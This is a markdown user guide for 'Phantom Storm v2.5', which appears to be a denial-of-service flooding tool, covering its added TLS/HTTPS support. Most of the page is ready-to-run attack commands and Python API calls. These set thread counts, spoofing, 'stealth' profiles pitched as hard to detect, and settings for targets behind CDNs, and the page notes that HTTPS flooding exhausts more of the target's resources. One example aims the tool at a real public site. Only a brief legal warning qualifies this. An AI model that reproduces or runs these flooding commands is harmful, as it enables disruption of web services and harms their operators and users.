# 🔐 TLS/HTTPS Support Documentation

## Overview

Feature #3 adds comprehensive TLS/HTTPS support to Phantom Storm, enabling realistic attacks against modern HTTPS-enabled web servers. This feature includes:

- **SSL/TLS Encryption** - Full HTTPS support with TLS 1.0 through 1.3
- **SNI Support** - Server Name Indication for virtual hosting
- **Certificate Options** - Flexible certificate verification
- **Version Selection** - Choose specific TLS versions or auto-negotiate

---

## 🎯 Why HTTPS Support?

### Modern Web Reality
- **95%+ of websites** use HTTPS (2024)
- HTTP-only attacks are increasingly unrealistic
- Production environments require HTTPS testing
- CDNs and load balancers demand TLS

### Testing Benefits
- ✅ Test real-world scenarios
- ✅ Validate TLS configuration strength
- ✅ Check certificate handling
- ✅ Assess resource impact of SSL/TLS
- ✅ Bypass HTTPS-only defenses

---

## 🚀 Quick Start

### Basic HTTPS Attack

```bash
# Simple HTTPS attack on port 443
python phantom_storm_v2.py 192.168.1.100 443 200 --https
```

### With SNI (Recommended)

```bash
# HTTPS attack with Server Name Indication
python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=www.example.com
```

### Force TLS Version

```bash
# Force TLS 1.2
python phantom_storm_v2.py 192.168.1.100 443 200 --https --tls-version=TLS_1_2
```

---

## 📋 CLI Reference

### HTTPS Flags

| Flag | Description | Example |
|------|-------------|---------|
| `--https` | Enable HTTPS/TLS | `--https` |
| `--sni=HOSTNAME` | SNI hostname | `--sni=www.site.com` |
| `--verify-ssl` | Verify certificates | `--verify-ssl` |
| `--tls-version=VER` | TLS version | `--tls-version=TLS_1_2` |

### TLS Versions

| Version | Value | Description |
|---------|-------|-------------|
| TLS 1.0 | `TLS_1_0` | Old, deprecated, insecure |
| TLS 1.1 | `TLS_1_1` | Deprecated |
| TLS 1.2 | `TLS_1_2` | Current standard ⭐ |
| TLS 1.3 | `TLS_1_3` | Latest, most secure |
| Auto | `AUTO` | Auto-negotiate (default) |

---

## 💡 Usage Examples

### 1. Basic HTTPS vs HTTP

**HTTP (Traditional):**
```bash
python phantom_storm_v2.py 192.168.1.100 80 200
```

**HTTPS (Modern):**
```bash
python phantom_storm_v2.py 192.168.1.100 443 200 --https
```

### 2. Lab Environment (Self-Signed Certificates)

```bash
# Disable certificate verification for lab
python phantom_storm_v2.py 192.168.1.100 443 200 --https

# Note: Certificate verification is DISABLED by default
# Perfect for self-signed certs in lab environments
```

### 3. Production Testing (Valid Certificates)

```bash
# Enable certificate verification
python phantom_storm_v2.py production.example.com 443 200 --https --verify-ssl --sni=production.example.com
```

### 4. Virtual Hosting with SNI

```bash
# Server hosts multiple sites on one IP
# Site 1
python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=site1.com

# Site 2
python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=site2.com
```

### 5. TLS Version Testing

```bash
# Test if server accepts old TLS 1.0
python phantom_storm_v2.py 192.168.1.100 443 100 --https --tls-version=TLS_1_0

# Force modern TLS 1.3
python phantom_storm_v2.py 192.168.1.100 443 100 --https --tls-version=TLS_1_3
```

### 6. Combined with Profiles

```bash
# Stealth HTTPS attack
python phantom_storm_v2.py 192.168.1.100 443 50 --profile=stealth --https

# Aggressive HTTPS attack
python phantom_storm_v2.py 192.168.1.100 443 300 --profile=aggressive --https --sni=target.com
```

### 7. Combined with HTTP Methods

```bash
# HTTPS POST attack
python phantom_storm_v2.py 192.168.1.100 443 200 --https --method=POST

# HTTPS with random methods
python phantom_storm_v2.py 192.168.1.100 443 200 --https --random-method
```

### 8. Full Feature Combination

```bash
# Ultimate attack: HTTPS + Profile + Methods + Spoofing
python phantom_storm_v2.py 192.168.1.100 443 150 \
    --https \
    --sni=www.target.com \
    --tls-version=TLS_1_2 \
    --profile=balanced \
    --random-method
```

---

## 🏗️ Architecture

### TLS Components

```
phantom_storm_v2.py
    │
    ├─ Parse --https flags
    ├─ Create TLSConfig
    │
    └─> AttackWorker
            │
            ├─ Initialize TLSHandler
            ├─ Create raw socket
            ├─ Wrap with SSL (TLSHandler.wrap_socket)
            └─ Send HTTPS requests
```

### Key Classes

#### TLSConfig
```python
@dataclass
class TLSConfig:
    use_https: bool = False
    verify_ssl: bool = False
    tls_version: str = "AUTO"
    sni_hostname: Optional[str] = None
    timeout: int = 10
    ciphers: Optional[str] = None
```

#### TLSHandler
```python
class TLSHandler:
    def __init__(self, config: TLSConfig)
    def wrap_socket(self, sock, server_hostname) -> ssl.SSLSocket
    def get_cipher_info(self, ssl_sock) -> dict
    def get_peer_certificate(self, ssl_sock) -> dict
    def get_protocol_version(self, ssl_sock) -> str
```

#### TLSHelper
```python
class TLSHelper:
    @staticmethod
    def is_https_port(port: int) -> bool
    def extract_hostname_from_url(url: str) -> str
    def get_available_tls_versions() -> list
    def format_cipher_suite(cipher_info: dict) -> str
    def validate_tls_config(config: TLSConfig) -> tuple
```

---

## 🔬 Python API Usage

### Basic HTTPS Attack

```python
from src.core import AttackWorker
from src.core.tls_handler import TLSConfig
from src import AttackStatistics

# Create TLS configuration
tls_config = TLSConfig(
    use_https=True,
    verify_ssl=False,
    tls_version="AUTO"
)

# Create attack worker with HTTPS
stats = AttackStatistics()
worker = AttackWorker(
    target_ip="192.168.1.100",
    target_port=443,
    stats=stats,
    worker_id=1,
    use_spoofing=True,
    tls_config=tls_config
)

# Start attack
worker.run()
```

### Advanced HTTPS Configuration

```python
from src.core.tls_handler import TLSConfig, TLSHandler, TLSHelper

# Validate TLS config
config = TLSConfig(
    use_https=True,
    verify_ssl=False,
    tls_version="TLS_1_2",
    sni_hostname="www.target.com",
    timeout=10
)

is_valid, error = TLSHelper.validate_tls_config(config)
if not is_valid:
    print(f"Invalid config: {error}")
else:
    # Use config
    handler = TLSHandler(config)
```

### Check Available TLS Versions

```python
from src.core.tls_handler import TLSHelper

versions = TLSHelper.get_available_tls_versions()
print(f"Available TLS versions: {versions}")
# Output: ['TLS_1_0', 'TLS_1_1', 'TLS_1_2', 'TLS_1_3', 'AUTO']
```

### Extract Hostname for SNI

```python
from src.core.tls_handler import TLSHelper

hostname = TLSHelper.extract_hostname_from_url("https://www.example.com/path")
print(f"SNI hostname: {hostname}")
# Output: www.example.com
```

---

## 📊 HTTP vs HTTPS Comparison

### Performance Impact

| Aspect | HTTP | HTTPS | Notes |
|--------|------|-------|-------|
| **Connection Speed** | Fast | Slower | TLS handshake adds latency |
| **CPU Usage (Client)** | Low | Higher | Encryption overhead |
| **CPU Usage (Server)** | Low | Higher | Decryption overhead |
| **Memory Usage** | Lower | Higher | SSL buffers |
| **Bandwidth** | Lower | Higher | TLS headers |
| **Attack Impact** | Good | Better | HTTPS exhausts more resources |

### When to Use Each

**Use HTTP when:**
- Target is HTTP-only (rare now)
- Testing old/legacy systems
- Lab environment without TLS
- Lower resource usage needed

**Use HTTPS when:**
- Target requires HTTPS (most common)
- Realistic production testing
- Modern web applications
- CDN/load balancer testing

---

## 🎓 Common Scenarios

### Scenario 1: Lab with Self-Signed Cert

**Setup:**
- Ubuntu Nginx with self-signed certificate
- Internal testing only

**Solution:**
```bash
# Disable verification (default behavior)
python phantom_storm_v2.py 192.168.1.2 443 150 --https --profile=balanced
```

### Scenario 2: Production with Valid Cert

**Setup:**
- Production website with Let's Encrypt cert
- Valid certificate chain

**Solution:**
```bash
# Enable verification
python phantom_storm_v2.py production.com 443 100 --https --verify-ssl --sni=production.com
```

### Scenario 3: Virtual Hosting

**Setup:**
- One IP hosts multiple domains
- Each domain has its own certificate

**Solution:**
```bash
# Attack specific virtual host
python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=site1.example.com
```

### Scenario 4: TLS Version Audit

**Setup:**
- Need to check if server accepts old TLS versions

**Solution:**
```bash
# Test TLS 1.0 (should fail on secure servers)
python phantom_storm_v2.py target.com 443 50 --https --tls-version=TLS_1_0

# Test TLS 1.2 (should work)
python phantom_storm_v2.py target.com 443 50 --https --tls-version=TLS_1_2
```

### Scenario 5: CDN Testing

**Setup:**
- Target behind Cloudflare/Akamai
- Requires SNI and modern TLS

**Solution:**
```bash
# Use TLS 1.2+ with SNI
python phantom_storm_v2.py cdn-target.com 443 200 --https --sni=cdn-target.com --tls-version=TLS_1_2
```

---

## 🧪 Testing & Validation

### Run TLS Tests

```bash
# Run TLS handler unit tests
python tests\test_tls_handler.py

# Expected: 40+ tests passing
```

### Test HTTPS Attack

```bash
# Test against public HTTPS site (for testing only!)
python phantom_storm_v2.py httpbin.org 443 10 --https --sni=httpbin.org

# Test in your lab
python phantom_storm_v2.py 192.168.1.100 443 50 --https
```

### Verify TLS Handshake

```bash
# On target server, check TLS connections
sudo tcpdump -i any port 443 -n

# Look for "Client Hello" and "Server Hello" in TLS handshake
```

---

## 🔧 Troubleshooting

### Issue: SSL Handshake Failed

**Error:**
```
Worker X: SSL handshake failed - [SSL: WRONG_VERSION_NUMBER]
```

**Solutions:**
1. Check if port actually uses HTTPS:
   ```bash
   openssl s_client -connect 192.168.1.100:443
   ```

2. Try different TLS version:
   ```bash
   python phantom_storm_v2.py TARGET 443 100 --https --tls-version=TLS_1_2
   ```

3. Verify server supports TLS:
   ```bash
   nmap --script ssl-enum-ciphers -p 443 TARGET
   ```

### Issue: Certificate Verification Failed

**Error:**
```
ssl.SSLCertVerificationError: certificate verify failed
```

**Solutions:**
1. Disable verification (default):
   ```bash
   python phantom_storm_v2.py TARGET 443 100 --https
   # Note: --verify-ssl is OFF by default
   ```

2. Don't use --verify-ssl flag for self-signed certs

### Issue: Connection Timeout

**Error:**
```
Worker X: Connection timeout
```

**Solutions:**
1. HTTPS requires more time - reduce threads:
   ```bash
   python phantom_storm_v2.py TARGET 443 50 --https
   ```

2. Use Stealth profile:
   ```bash
   python phantom_storm_v2.py TARGET 443 50 --profile=stealth --https
   ```

### Issue: Low Success Rate

**Symptoms:**
- Success rate < 50%
- Many SSL errors

**Solutions:**
1. Check TLS version compatibility:
   ```bash
   python phantom_storm_v2.py TARGET 443 50 --https --tls-version=AUTO
   ```

2. Reduce thread count (HTTPS is resource-intensive):
   ```bash
   python phantom_storm_v2.py TARGET 443 100 --https  # Instead of 300
   ```

3. Check if SNI is required:
   ```bash
   python phantom_storm_v2.py TARGET 443 50 --https --sni=www.target.com
   ```

### Issue: "Invalid TLS Version"

**Error:**
```
[ERROR] Invalid TLS version: TLS_1_9
```

**Solution:**
Check available versions:
```python
python -c "from src.core.tls_handler import TLSHelper; print(TLSHelper.get_available_tls_versions())"
```

Use valid version: `TLS_1_0`, `TLS_1_1`, `TLS_1_2`, `TLS_1_3`, or `AUTO`

---

## 🛡️ Security Considerations

### Certificate Verification

**Default (Disabled):**
- Good for lab environments
- Works with self-signed certificates
- Skip verification overhead

**Enabled (--verify-ssl):**
- Realistic production testing
- Validates certificate chain
- May fail with self-signed certs

### TLS Version Selection

**Modern (TLS 1.2/1.3):**
- ✅ Secure
- ✅ Required by most servers
- ✅ Good cipher suites

**Legacy (TLS 1.0/1.1):**
- ⚠️ Deprecated
- ⚠️ Known vulnerabilities
- ⚠️ Most servers reject

**Recommendation:** Use `AUTO` (default) or `TLS_1_2`

### SNI Security

**With SNI:**
- Server knows which site you're attacking
- Required for virtual hosting
- Logged in server SNI logs

**Without SNI:**
- May get default certificate
- May fail on virtual hosts
- Less specific

### Resource Impact

**HTTPS uses MORE resources than HTTP:**
- Client CPU: +20-30%
- Server CPU: +30-40%
- Memory: +10-20%
- Latency: +50-100ms

**Implication:** Fewer threads needed for same impact

---

## 📈 Performance Guidelines

### Thread Count Recommendations

| Profile | HTTP Threads | HTTPS Threads | Reason |
|---------|--------------|---------------|--------|
| **Stealth** | 50 | 30-40 | HTTPS adds overhead |
| **Balanced** | 150 | 100-120 | Balance impact/resources |
| **Aggressive** | 300 | 200-250 | Max sustainable load |

### Monitoring Impact

**On Target Server:**
```bash
# CPU usage (HTTPS will be higher)
top

# TLS connections
netstat -an | grep :443 | wc -l

# SSL session cache
cat /proc/cpuinfo | grep "model name"  # Check CPU capacity
```

**Expected Results:**
- HTTPS: 1.5-2x CPU usage vs HTTP
- HTTPS: Slower connection rate
- HTTPS: Higher memory usage

---

## 🔗 Related Documentation

- [Attack Profiles](./ATTACK_PROFILES.md) - Use profiles with HTTPS
- [HTTP Methods](./HTTP_METHODS.md) - Combine methods with HTTPS
- [API Reference](./API.md) - Full TLS API documentation
- [Monitoring Guide](./MONITOR.md) - Monitor HTTPS attacks

---

## 📝 Changelog

**v2.5.0** - Feature #3: TLS/HTTPS Support
- ✨ Added full HTTPS/TLS support
- ✨ TLS 1.0 through 1.3 support
- ✨ SNI (Server Name Indication)
- ✨ Certificate verification options
- ✨ TLS version selection
- ✨ 40+ unit tests
- ✨ Complete documentation

---

## 💡 Tips & Best Practices

### 1. Always Use SNI for Production

```bash
# Bad (may fail or attack wrong site)
python phantom_storm_v2.py 192.168.1.100 443 200 --https

# Good (specific target)
python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=www.target.com
```

### 2. Start with Lower Threads for HTTPS

```bash
# HTTP: 300 threads works
python phantom_storm_v2.py TARGET 80 300

# HTTPS: Start with 150-200
python phantom_storm_v2.py TARGET 443 150 --https
```

### 3. Use AUTO TLS Version Unless Specific Need

```bash
# Good (auto-negotiates)
python phantom_storm_v2.py TARGET 443 200 --https

# Only if testing specific version
python phantom_storm_v2.py TARGET 443 200 --https --tls-version=TLS_1_2
```

### 4. Disable Verification in Labs

```bash
# Lab with self-signed cert (default behavior)
python phantom_storm_v2.py 192.168.1.2 443 150 --https

# Don't use --verify-ssl unless testing production
```

### 5. Combine with Profiles for Best Results

```bash
# Stealth HTTPS - hard to detect
python phantom_storm_v2.py TARGET 443 50 --profile=stealth --https

# Balanced HTTPS - most common
python phantom_storm_v2.py TARGET 443 150 --profile=balanced --https
```

---

## ⚠️ Important Warnings

### HTTPS Resource Usage

⚠️ **HTTPS attacks consume MORE resources:**
- Your machine: Higher CPU/memory
- Target server: 1.5-2x CPU usage
- Network: More bandwidth

**Recommendation:** Use fewer threads with HTTPS

### Certificate Errors

⚠️ **Self-signed certificates:**
- Default behavior: Verification DISABLED
- Works out of the box in labs
- Don't use --verify-ssl flag

### SNI Requirement

⚠️ **Many modern servers REQUIRE SNI:**
- Cloudflare, AWS, Azure all need SNI
- Virtual hosting needs SNI
- Always use --sni for production

### Legal Compliance

⚠️ **HTTPS doesn't change legal requirements:**
- Still need written authorization
- Still illegal without permission
- HTTPS just changes the protocol

---

## 🎯 Summary

**Key Points:**
1. Use `--https` for HTTPS attacks
2. Add `--sni=HOSTNAME` for virtual hosting
3. Certificate verification DISABLED by default (good for labs)
4. Use `AUTO` TLS version (default)
5. HTTPS needs fewer threads than HTTP
6. Combine with profiles and methods

**Quickstart:**
```bash
# Lab testing
python phantom_storm_v2.py 192.168.1.100 443 150 --https --profile=balanced

# Production testing (with authorization!)
python phantom_storm_v2.py target.com 443 100 --https --sni=target.com --verify-ssl
```

---

**⚡ Phantom Storm v2.5 - TLS/HTTPS Support**

*"Modern attacks for modern websites"*
